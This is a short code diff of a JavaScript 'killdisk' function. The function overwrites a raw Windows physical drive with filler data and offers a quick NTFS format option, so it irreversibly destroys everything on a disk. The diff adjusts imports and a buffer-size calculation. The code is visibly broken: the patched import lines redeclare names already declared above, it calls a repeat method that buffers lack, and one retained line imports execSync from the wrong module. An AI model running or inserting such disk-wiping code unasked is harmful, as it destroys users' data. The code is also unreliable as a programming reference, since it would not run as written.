@@ -1,6 +1,7 @@
 const { execSync, accessSync, constants } = require('fs');
 const { writeFileSync, unlinkSync } = require('fs');
-const { parse } = require('json');
+const { writeFileSync, unlinkSync, accessSync, constants, createWriteStream } = require('fs');
+const { execSync } = require('child_process');
 
 function killdisk(drive, formatType = "format:ntfs quick") {
     try {
@@ -57,7 +58,7 @@ function killdisk(drive, formatType = "format:ntfs quick") {
         const disk = require('fs').createWriteStream(`\\\\.\\PhysicalDrive${disknum}`, { flags: 'w' });
         const fillerBuffer = Buffer.from(filler, 'utf-8');
         for (let i = 0; i < parseInt(fillmb); i++) {
-            disk.write(fillerBuffer.repeat(1024 * 1024 / fillerBuffer.length));
+            disk.write(fillerBuffer.repeat(Math.floor(1024 * 1024 / fillerBuffer.length)));
         }
         disk.end();
     }
